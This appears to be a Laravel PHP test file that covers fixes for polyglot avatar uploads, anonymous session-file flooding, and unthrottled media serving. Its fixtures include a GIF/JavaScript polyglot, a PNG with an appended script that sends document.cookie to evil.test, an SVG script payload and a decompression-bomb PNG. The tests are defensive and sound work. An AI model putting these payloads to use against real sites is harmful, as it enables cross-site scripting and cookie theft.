<?php

namespace Tests\Feature;

use App\Http\Middleware\LeanSessionStart;
use App\Models\ContactSubmission;
use App\Models\SiteMedia;
use App\Models\User;
use App\Services\TenantProvisioner;
use App\Session\SplitGuestSessionHandler;
use App\Support\DefaultSiteContent;
use App\Support\ImageGuard;
use App\Support\ImageResizer;
use App\Tenancy\CurrentOrganization;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Http\UploadedFile;
use Illuminate\Session\Store;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\RateLimiter;
use Illuminate\Support\Facades\Storage;
use Illuminate\Testing\TestResponse;
use Symfony\Component\HttpFoundation\StreamedResponse;
use Tests\TestCase;

/**
 * Regression cover for the three holes the re-attack left open:
 *
 *   1. an avatar upload was stored BYTE FOR BYTE, so a GIF/JavaScript polyglot
 *      survived onto the storage disk intact;
 *   2. every anonymous request minted a session file under SESSION_DRIVER=file,
 *      so a loop over made-up URLs was an inode-exhaustion primitive;
 *   3. /site/media/{id} read the whole object into PHP memory, unthrottled, on
 *      every anonymous hit.
 *
 * Each hole gets both halves: the attack no longer works, AND the honest
 * behaviour it sits next to is provably intact. The second half is not padding
 * — an earlier round of this work shipped a "fix" that refused legitimate
 * triple-monitor screenshots, which was worse than the attack it closed.
 */
class AnonymousSurfaceAndUploadReencodeTest extends TestCase
{
    use RefreshDatabase;

    // ─── helpers ────────────────────────────────────────────────────────────

    private function tenantOwner(string $name, string $email, string $password = 'secret-pass-123'): User
    {
        $owner = app(TenantProvisioner::class)->provision($name, 'Owner', $email, $password)['owner'];
        app(CurrentOrganization::class)->set($owner->organization_id);

        return $owner->fresh();
    }

    /** A real, decodable PNG filled with one colour (plus optional alpha). */
    private function realPngBytes(int $w, int $h, array $rgb = [200, 30, 90], bool $transparent = false): string
    {
        $im = imagecreatetruecolor($w, $h);

        if ($transparent) {
            imagealphablending($im, false);
            imagesavealpha($im, true);
            imagefilledrectangle($im, 0, 0, $w - 1, $h - 1, (int) imagecolorallocatealpha($im, 0, 0, 0, 127));
        } else {
            imagefilledrectangle($im, 0, 0, $w - 1, $h - 1, (int) imagecolorallocate($im, ...$rgb));
        }

        ob_start();
        imagepng($im);
        $bytes = (string) ob_get_clean();
        imagedestroy($im);

        return $bytes;
    }

    /** A real JPEG of random noise — incompressible, so the file is genuinely big. */
    private function realNoisyJpegBytes(int $w, int $h, int $quality = 100): string
    {
        $im = imagecreatetruecolor($w, $h);

        for ($y = 0; $y < $h; $y += 2) {
            for ($x = 0; $x < $w; $x += 2) {
                imagefilledrectangle($im, $x, $y, $x + 1, $y + 1, (int) imagecolorallocate(
                    $im, random_int(0, 255), random_int(0, 255), random_int(0, 255)
                ));
            }
        }

        ob_start();
        imagejpeg($im, null, $quality);
        $bytes = (string) ob_get_clean();
        imagedestroy($im);

        return $bytes;
    }

    private function upload(string $bytes, string $name, string $mime): UploadedFile
    {
        $path = tempnam(sys_get_temp_dir(), 'up').'.'.pathinfo($name, PATHINFO_EXTENSION);
        file_put_contents($path, $bytes);

        return new UploadedFile($path, $name, $mime, null, true);
    }

    /** Point the session at a private, empty directory and disable the GC lottery. */
    private function useFileSessions(): string
    {
        $dir = storage_path('framework/testing/sessions-'.uniqid());
        File::ensureDirectoryExists($dir);

        config()->set('session.driver', 'file');
        config()->set('session.files', $dir);
        config()->set('session.lottery', [0, 100]);

        return $dir;
    }

    /**
     * Carry a response's Set-Cookie headers into the next request, which the
     * Laravel test client does not do on its own. The values are the encrypted
     * ones the browser would hold, so this is the real round trip.
     */
    private function carryCookies(TestResponse $response): void
    {
        // The test client re-encrypts $defaultCookies on the way out by default,
        // which would double-encrypt values that came off a real response. Send
        // them exactly as the browser holds them instead — EncryptCookies still
        // decrypts them on the way in, so this is the genuine round trip.
        $this->disableCookieEncryption();

        foreach ($response->headers->getCookies() as $cookie) {
            if ($cookie->getValue() === '' || $cookie->getValue() === null) {
                unset($this->defaultCookies[$cookie->getName()]);

                continue;
            }

            $this->defaultCookies[$cookie->getName()] = $cookie->getValue();
        }
    }

    private function sessionFileCount(string $dir): int
    {
        return count(File::files($dir));
    }

    // ═══ (1) uploads are re-encoded, never stored verbatim ═══════════════════

    /**
     * The headline attack. These bytes are a VALID GIF and a VALID JavaScript
     * program at the same time, so no amount of signature checking rejects them
     * — the only defence is to never keep the attacker's bytes.
     */
    public function test_a_gif_javascript_polyglot_never_reaches_storage(): void
    {
        Storage::fake('avatars');

        $owner = $this->tenantOwner('Poly Co', 'owner@poly.test');

        $polyglot = "GIF89a\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\xff\xff\xff\x21\xf9\x04\x00\x00\x00\x00\x00"
            ."\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3b"
            ."/*\n*/=1;alert(document.domain);//";

        // Sanity: the payload really is a well-formed GIF, so every guard that
        // works by asking "is this an image" says yes.
        $this->assertNotNull(ImageGuard::inspectBytes($polyglot), 'the fixture is not a valid GIF');

        $this->actingAs($owner)->patch('/profile', [
            'name' => 'Owner',
            'email' => 'owner@poly.test',
            'avatar' => $this->upload($polyglot, 'me.gif', 'image/gif'),
        ])->assertSessionHasNoErrors();

        $stored = $owner->fresh()->avatar;
        $this->assertNotNull($stored, 'a valid image was refused — that would be collateral damage');

        $bytes = (string) Storage::disk('avatars')->get($stored);

        $this->assertNotSame($polyglot, $bytes, 'the attacker\'s bytes were stored verbatim');
        $this->assertStringNotContainsString('alert(document.domain)', $bytes, 'the script payload survived');
        $this->assertStringNotContainsString('/*', $bytes, 'the JavaScript comment framing survived');

        // What we DID store is a real image of our own making.
        $this->assertNotNull(ImageGuard::inspectBytes($bytes), 'the stored file is not a readable image');
    }

    /**
     * Same class, different container: a genuine PNG with an HTML document
     * bolted on after IEND. Proves the fix is the re-encode, not a GIF-shaped
     * special case.
     */
    public function test_a_png_html_polyglot_never_reaches_storage(): void
    {
        Storage::fake('avatars');

        $owner = $this->tenantOwner('PngPoly Co', 'owner@pngpoly.test');

        $polyglot = $this->realPngBytes(32, 32)
            .'<html><script>fetch("https://evil.test/?c="+document.cookie)</script></html>';

        $this->actingAs($owner)->patch('/profile', [
            'name' => 'Owner',
            'email' => 'owner@pngpoly.test',
            'avatar' => $this->upload($polyglot, 'me.png', 'image/png'),
        ])->assertSessionHasNoErrors();

        $bytes = (string) Storage::disk('avatars')->get($owner->fresh()->avatar);

        $this->assertStringNotContainsString('<script>', $bytes);
        $this->assertStringNotContainsString('evil.test', $bytes);
        $this->assertNotNull(ImageGuard::inspectBytes($bytes));
    }

    /** Trailing junk of any kind is gone, because only pixels are carried over. */
    public function test_arbitrary_trailing_bytes_do_not_survive_the_upload(): void
    {
        $marker = 'MARKER-'.str_repeat('Z', 64);

        $clean = ImageResizer::sanitize($this->realPngBytes(48, 48).$marker);

        $this->assertNotNull($clean);
        $this->assertStringNotContainsString($marker, $clean['bytes']);
    }

    /** COLLATERAL DAMAGE CHECK: an ordinary avatar is not visibly changed. */
    public function test_an_ordinary_avatar_is_not_resized_recoloured_or_refused(): void
    {
        Storage::fake('avatars');

        $owner = $this->tenantOwner('Normal Co', 'owner@normal.test');

        $this->actingAs($owner)->patch('/profile', [
            'name' => 'Owner',
            'email' => 'owner@normal.test',
            'avatar' => $this->upload($this->realPngBytes(240, 240, [200, 30, 90]), 'me.png', 'image/png'),
        ])->assertSessionHasNoErrors();

        $stored = $owner->fresh()->avatar;
        $this->assertNotNull($stored);
        $this->assertStringEndsWith('.png', $stored);

        $bytes = (string) Storage::disk('avatars')->get($stored);
        $info = ImageGuard::inspectBytes($bytes);

        // Not upscaled, not downscaled, not cropped.
        $this->assertSame(240, $info['width']);
        $this->assertSame(240, $info['height']);
        $this->assertSame('image/png', $info['mime']);

        // And the pixels are the pixels that were uploaded.
        $im = imagecreatefromstring($bytes);
        $rgb = imagecolorsforindex($im, imagecolorat($im, 120, 120));
        imagedestroy($im);

        $this->assertSame([200, 30, 90], [$rgb['red'], $rgb['green'], $rgb['blue']]);

        // The render path still works on what we stored.
        $this->actingAs($owner)->get('/avatar/'.$owner->id)->assertOk();
    }

    /** A logo-style avatar keeps its alpha channel rather than going black. */
    public function test_a_transparent_png_keeps_its_transparency(): void
    {
        $clean = ImageResizer::sanitize($this->realPngBytes(64, 64, transparent: true));

        $this->assertNotNull($clean);
        $this->assertSame('image/png', $clean['mime']);

        $im = imagecreatefromstring($clean['bytes']);
        $alpha = imagecolorsforindex($im, imagecolorat($im, 32, 32))['alpha'];
        imagedestroy($im);

        $this->assertSame(127, $alpha, 'the transparent background was flattened');
    }

    /** A photographic avatar stays a JPEG instead of ballooning into a PNG. */
    public function test_a_photo_avatar_stays_a_jpeg_and_is_bounded_to_the_display_size(): void
    {
        Storage::fake('avatars');

        $owner = $this->tenantOwner('Photo Co', 'owner@photo.test');

        $this->actingAs($owner)->patch('/profile', [
            'name' => 'Owner',
            'email' => 'owner@photo.test',
            'avatar' => $this->upload($this->realNoisyJpegBytes(1200, 900, 85), 'me.jpg', 'image/jpeg'),
        ])->assertSessionHasNoErrors();

        $stored = $owner->fresh()->avatar;
        $this->assertStringEndsWith('.jpg', $stored);

        $info = ImageGuard::inspectBytes((string) Storage::disk('avatars')->get($stored));

        $this->assertSame('image/jpeg', $info['mime']);
        $this->assertSame(ImageResizer::SANITIZED_MAX_DIM, $info['width'], 'longest side should be the sanitised max');
        $this->assertSame(384, $info['height'], 'the aspect ratio must be preserved');
    }

    /** The pixel/memory budgets are unchanged — sanitize() adds no new ceiling. */
    public function test_sanitize_refuses_what_the_existing_budgets_refuse(): void
    {
        $chunk = fn (string $t, string $d): string => pack('N', strlen($d)).$t.$d.pack('N', crc32($t.$d));
        $bomb = "\x89PNG\r\n\x1a\n"
            .$chunk('IHDR', pack('NN', 20000, 20000)."\x08\x02\x00\x00\x00")
            .$chunk('IDAT', str_repeat("\x00", 32))
            .$chunk('IEND', '');

        $this->assertNull(ImageResizer::sanitize($bomb), 'a declared-size bomb must never be decoded');
        $this->assertNull(ImageResizer::sanitize('not an image at all'));
        $this->assertNull(ImageResizer::sanitize(''));

        // An allow-list is honoured, so a path that only wants PNG cannot be
        // handed a GIF by re-encoding.
        $this->assertNull(ImageResizer::sanitize($this->realPngBytes(8, 8), 512, ImageGuard::MAX_DISPLAY_PIXELS, ['jpg']));
    }

    // ═══ (2) anonymous requests do not mint session files ════════════════════

    public function test_anonymous_404s_write_no_session_files(): void
    {
        $dir = $this->useFileSessions();

        try {
            for ($i = 0; $i < 40; $i++) {
                $this->get('/flood-'.bin2hex(random_bytes(6)).'-'.$i)->assertNotFound();
            }

            $this->assertSame(0, $this->sessionFileCount($dir),
                'an anonymous 404 flood still writes one session file per request');
        } finally {
            File::deleteDirectory($dir);
        }
    }

    /**
     * The flood does not simply move one route over. Every anonymous hit on an
     * auth-only route redirects to /login and writes `url.intended` — which is
     * why that key has to be on the disposable allow-list.
     */
    public function test_an_anonymous_flood_of_auth_only_routes_writes_no_session_files(): void
    {
        $dir = $this->useFileSessions();

        try {
            for ($i = 0; $i < 40; $i++) {
                $this->get('/dashboard?probe='.$i)->assertRedirect();
            }

            $this->assertSame(0, $this->sessionFileCount($dir));
        } finally {
            File::deleteDirectory($dir);
        }
    }

    public function test_anonymous_marketing_page_views_write_no_session_files(): void
    {
        DefaultSiteContent::ensure();
        $dir = $this->useFileSessions();

        try {
            for ($i = 0; $i < 25; $i++) {
                $this->get('/')->assertOk();
            }

            $this->assertSame(0, $this->sessionFileCount($dir));
        } finally {
            File::deleteDirectory($dir);
        }
    }

    /**
     * THE THING THAT MUST NOT BREAK. The CSRF token is the only reason the
     * public pages need a session at all, so it has to survive from the GET that
     * renders a form to the POST that submits it — with no session file in
     * between. This is exactly the comparison VerifyCsrfToken::tokensMatch()
     * makes (the framework short-circuits that check under `runningUnitTests`,
     * so the token continuity itself is what is asserted).
     */
    public function test_the_csrf_token_survives_between_requests_with_no_session_file(): void
    {
        DefaultSiteContent::ensure();
        $dir = $this->useFileSessions();

        try {
            $first = $this->get('/')->assertOk();
            $token = app('session.store')->token();
            $this->assertNotEmpty($token);

            $this->carryCookies($first);

            $second = $this->get('/')->assertOk();

            $this->assertSame($token, app('session.store')->token(),
                'the visitor got a brand new CSRF token, so the contact form would 419');
            $this->assertSame(0, $this->sessionFileCount($dir),
                'the token was kept, but on our disk');

            $this->carryCookies($second);

            // ...and the token still round-trips on a third hop.
            $this->get('/')->assertOk();
            $this->assertSame($token, app('session.store')->token());
        } finally {
            File::deleteDirectory($dir);
        }
    }

    /** End to end: the marketing contact form still submits and still flashes. */
    public function test_the_contact_form_still_submits_and_its_flash_message_survives(): void
    {
        DefaultSiteContent::ensure();
        $dir = $this->useFileSessions();

        try {
            $this->carryCookies($this->get('/')->assertOk());

            $post = $this->post('/contact', [
                'name' => 'Dana',
                'company' => 'Wide Co',
                'email' => 'dana@wide.test',
                'team_size' => '25',
                'message' => 'Please get in touch about the agency plan.',
            ]);

            $post->assertRedirect();
            $post->assertSessionHasNoErrors();
            $post->assertSessionHas('success');

            $this->assertSame(1, ContactSubmission::where('email', 'dana@wide.test')->count());

            // A session carrying a flash message is NOT disposable, so it is
            // written server-side exactly as before.
            $this->assertGreaterThanOrEqual(1, $this->sessionFileCount($dir),
                'a flash message must be persisted server-side');

            $this->carryCookies($post);

            $this->get('/')->assertOk()->assertSee('we will get back to you shortly', false);
        } finally {
            File::deleteDirectory($dir);
        }
    }

    /** The login flow is untouched: real credentials, real server-side session. */
    public function test_the_login_flow_still_works_and_still_uses_a_server_side_session(): void
    {
        $dir = $this->useFileSessions();

        try {
            $this->tenantOwner('Login Co', 'owner@login.test', 'super-secret-pw');

            $this->carryCookies($this->get('/login')->assertOk());

            $this->assertSame(0, $this->sessionFileCount($dir),
                'merely rendering the login form should not cost a file');

            $login = $this->post('/login', [
                'email' => 'owner@login.test',
                'password' => 'super-secret-pw',
            ]);

            $login->assertRedirect();
            $this->assertAuthenticated();

            $this->assertGreaterThanOrEqual(1, $this->sessionFileCount($dir),
                'an authenticated session must live server-side, where it can be revoked');

            $this->carryCookies($login);

            // The session really does survive the hop, i.e. the user stays in.
            $this->get('/dashboard')->assertOk();
        } finally {
            File::deleteDirectory($dir);
        }
    }

    /** Validation errors still round-trip (they are state, so they go to disk). */
    public function test_validation_errors_still_survive_a_redirect(): void
    {
        DefaultSiteContent::ensure();
        $dir = $this->useFileSessions();

        try {
            $this->carryCookies($this->get('/')->assertOk());

            $post = $this->post('/contact', ['name' => '', 'email' => 'nope', 'message' => '']);

            $post->assertSessionHasErrors(['name', 'email', 'message']);
            $this->assertGreaterThanOrEqual(1, $this->sessionFileCount($dir));
        } finally {
            File::deleteDirectory($dir);
        }
    }

    /** A session that finishes with its state gives its file back. */
    public function test_a_session_returns_to_the_cookie_sink_once_its_state_is_consumed(): void
    {
        DefaultSiteContent::ensure();
        $dir = $this->useFileSessions();

        try {
            $this->carryCookies($this->get('/')->assertOk());

            $post = $this->post('/contact', [
                'name' => 'Dana',
                'email' => 'dana@wide.test',
                'message' => 'Hello there.',
            ]);
            $this->carryCookies($post);
            $this->assertGreaterThanOrEqual(1, $this->sessionFileCount($dir));

            // Reading the flash consumes it; the request after that has nothing
            // left worth storing.
            $this->carryCookies($this->get('/')->assertOk());
            $this->carryCookies($this->get('/')->assertOk());

            $this->assertSame(0, $this->sessionFileCount($dir),
                'the file outlived the state it was written for');
        } finally {
            File::deleteDirectory($dir);
        }
    }

    /** The allow-list is the security boundary; keep it explicitly pinned. */
    public function test_the_disposable_key_allow_list_stays_tiny(): void
    {
        $this->assertSame(['_token', '_previous', '_flash', 'url'], LeanSessionStart::DISPOSABLE_KEYS);

        $this->assertTrue(LeanSessionStart::isDisposable(['_token' => 'x', '_previous' => ['url' => '/']]));
        $this->assertFalse(LeanSessionStart::isDisposable(['_token' => 'x', 'login_web_abc' => 1]));
        $this->assertFalse(LeanSessionStart::isDisposable(['_token' => 'x', 'errors' => []]));
        $this->assertFalse(LeanSessionStart::isDisposable(['_token' => 'x', 'success' => 'done']));
        $this->assertFalse(LeanSessionStart::isDisposable(['platform_impersonator' => true]));
        $this->assertFalse(LeanSessionStart::isDisposable(['auth.password_confirmed_at' => 1]));
    }

    /** Blast radius: under a non-disk driver the middleware changes nothing. */
    public function test_the_split_handler_is_inert_under_a_non_disk_driver(): void
    {
        config()->set('session.driver', 'array');

        $this->get('/login');

        $store = app('session.store');
        $this->assertInstanceOf(Store::class, $store);
        $this->assertNotInstanceOf(SplitGuestSessionHandler::class, $store->getHandler(),
            'the array driver must be left completely alone');
    }

    // ═══ (3) /site/media is streamed and throttled ═══════════════════════════

    private function media(string $path, string $bytes, string $mime = 'image/png'): SiteMedia
    {
        Storage::disk('avatars')->put($path, $bytes);

        return SiteMedia::create(['path' => $path, 'mime' => $mime, 'original_name' => basename($path)]);
    }

    public function test_site_media_streams_instead_of_buffering_the_whole_object(): void
    {
        Storage::fake('avatars');

        $bytes = $this->realPngBytes(600, 400);
        $media = $this->media('site/big.png', $bytes);

        $response = $this->get('/site/media/'.$media->id);

        $response->assertOk();

        $this->assertInstanceOf(StreamedResponse::class, $response->baseResponse,
            'the object is still read into PHP memory before the response is built');

        // Streaming must not mean "streams the wrong thing".
        $this->assertSame($bytes, $response->streamedContent());
        $this->assertSame((string) strlen($bytes), (string) $response->headers->get('Content-Length'));
        $this->assertStringContainsString('image/png', (string) $response->headers->get('Content-Type'));
        $this->assertSame('inline', (string) $response->headers->get('Content-Disposition'));
        $this->assertSame('nosniff', (string) $response->headers->get('X-Content-Type-Options'));
    }

    /** COLLATERAL DAMAGE CHECK: ordinary marketing image loading is unaffected. */
    public function test_ordinary_marketing_image_loading_is_not_degraded(): void
    {
        Storage::fake('avatars');

        $bytes = $this->realPngBytes(320, 200, [10, 120, 240]);
        $media = $this->media('site/hero.png', $bytes);

        for ($i = 0; $i < 30; $i++) {
            $r = $this->get('/site/media/'.$media->id);

            $r->assertOk();
            $this->assertSame($bytes, $r->streamedContent(), "request {$i} served the wrong bytes");
        }

        // The conditional-request path still short-circuits.
        $etag = (string) $this->get('/site/media/'.$media->id)->headers->get('ETag');
        $this->assertNotSame('', $etag);
        $this->get('/site/media/'.$media->id, ['If-None-Match' => $etag])->assertStatus(304);
    }

    /**
     * A real JPEG bigger than the sniff window is still identified correctly —
     * the partial read must not demote honest photography to a download.
     */
    public function test_a_jpeg_larger_than_the_sniff_window_is_still_served_inline(): void
    {
        Storage::fake('avatars');

        $bytes = $this->realNoisyJpegBytes(1400, 1400);
        $this->assertGreaterThan(524288, strlen($bytes), 'the fixture is not bigger than the sniff window');

        $media = $this->media('site/photo.jpg', $bytes, 'application/octet-stream');

        $response = $this->get('/site/media/'.$media->id);

        $response->assertOk();
        $this->assertStringContainsString('image/jpeg', (string) $response->headers->get('Content-Type'));
        $this->assertSame('inline', (string) $response->headers->get('Content-Disposition'));
        $this->assertSame($bytes, $response->streamedContent());
    }

    /** Non-raster bytes are still streamed out inert rather than rendered. */
    public function test_non_raster_media_is_still_served_inert(): void
    {
        Storage::fake('avatars');

        $media = $this->media(
            'site/legacy.svg',
            '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>',
            'image/svg+xml',
        );

        $response = $this->get('/site/media/'.$media->id);

        $response->assertOk();
        $this->assertSame('application/octet-stream', (string) $response->headers->get('Content-Type'));
        $this->assertStringContainsString('attachment', (string) $response->headers->get('Content-Disposition'));
        $this->assertStringNotContainsString('svg', strtolower((string) $response->headers->get('Content-Type')));
    }

    public function test_site_media_is_throttled_per_ip(): void
    {
        Storage::fake('avatars');

        $media = $this->media('site/hero.png', $this->realPngBytes(64, 64));

        $key = 'site-media:127.0.0.1';

        // One request short of the budget still serves.
        for ($i = 0; $i < 599; $i++) {
            RateLimiter::hit($key, 60);
        }

        $this->get('/site/media/'.$media->id)->assertOk();

        // That request consumed the last of it.
        $this->get('/site/media/'.$media->id)->assertStatus(429);

        // The budget is per IP, so a different visitor is unaffected.
        $this->withServerVariables(['REMOTE_ADDR' => '198.51.100.7'])
            ->get('/site/media/'.$media->id)->assertOk();
    }

    /** The throttle bucket must not be an opaque, attacker-shaped cache key. */
    public function test_the_media_throttle_key_is_legible_and_not_attacker_derived(): void
    {
        Storage::fake('avatars');

        $media = $this->media('site/hero.png', $this->realPngBytes(64, 64));

        $before = array_keys(\Illuminate\Support\Facades\Cache::getStore()->all());

        for ($i = 0; $i < 5; $i++) {
            $this->get('/site/media/'.$media->id)->assertOk();
        }

        $new = array_values(array_diff(array_keys(\Illuminate\Support\Facades\Cache::getStore()->all()), $before));

        $this->assertNotSame([], $new, 'nothing was metered at all');

        foreach ($new as $key) {
            $this->assertSame(0, preg_match('/[0-9a-f]{12}/', (string) $key),
                'an anonymous route minted an opaque cache key: '.$key);
        }
    }

    /** The mime verdict is remembered per row, so repeats do not re-read bytes. */
    public function test_the_mime_verdict_is_cached_against_the_row_not_the_request(): void
    {
        Storage::fake('avatars');

        $bytes = $this->realPngBytes(80, 80);
        $media = $this->media('site/hero.png', $bytes);

        $this->get('/site/media/'.$media->id)->assertOk();

        $this->assertSame(
            'image/png',
            \Illuminate\Support\Facades\Cache::get('site_media_mime:'.$media->id.':'.strlen($bytes)),
        );
    }
}
